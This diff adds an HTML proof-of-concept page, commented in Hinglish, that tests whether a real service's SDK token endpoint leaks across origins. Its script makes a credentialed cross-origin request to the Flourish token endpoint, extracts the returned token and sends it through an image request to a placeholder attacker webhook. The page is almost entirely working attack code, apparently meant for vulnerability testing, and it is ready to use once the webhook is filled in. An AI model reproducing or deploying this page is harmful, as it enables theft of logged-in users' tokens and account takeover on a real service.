@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SDK Token Exfiltration Test</title>
+</head>
+<body>
+    <h1>Loading... Checking for Cross-Origin Access</h1>
+    <p>Please wait a moment and check the Console (F12) for results.</p>
+    
+    <script>
+        const FLOURISH_TOKEN_ENDPOINT = 'https://app.flourish.studio/api/user/generate_sdk_token';
+        // Yahan apni churane wali URL daalo jiske aage "?token=" laga do
+        const YOUR_EXFILTRATION_BASE_URL = '<<ATTACKER_WEBHOOK_URL>>?token='; 
+
+        // 1. Fetch Request Bhejna
+        fetch(FLOURISH_TOKEN_ENDPOINT, {
+            method: 'GET',
+            credentials: 'include' // Ye cookies bhejta hai
+        })
+        .then(response => {
+            // Check karte hain ki response successfully padha ja sakta hai ya nahi
+            if (response.ok) {
+                return response.json();
+            } else {
+                console.error("CORS Error: Response status not OK or block likely.");
+                throw new Error('Could not read response body due to security rules.');
+            }
+        })
+        .then(data => {
+            // 2. Token nikalna
+            const token = data.sdk_token;
+            console.log("SUCCESS! Token Found:", token);
+            
+            // 3. Token Exfiltrate karna (Churaana)
+            if (token) {
+                // Token ko Attacker server pe bhej dena
+                const exfilUrl = YOUR_EXFILTRATION_BASE_URL + encodeURIComponent(token);
+                new Image().src = exfilUrl; // Image ke zariye token bhejna
+                document.querySelector('h1').textContent = "SUCCESS: Token Sent to Log Server!";
+                 
+                // Warning: Real attack mein ye alert nahi denge
+                alert("Token Chura Liya Gaya! Check your webhook logs.");
+            }
+        })
+        .catch(error => {
+            console.error("Attack Failed. CORS is likely enforcing Same-Origin Policy.", error);
+            document.querySelector('h1').textContent = "FAILURE: Token Exfiltration Failed (CORS Blocked).";
+        });
+    </script>
+</body>
+</html>
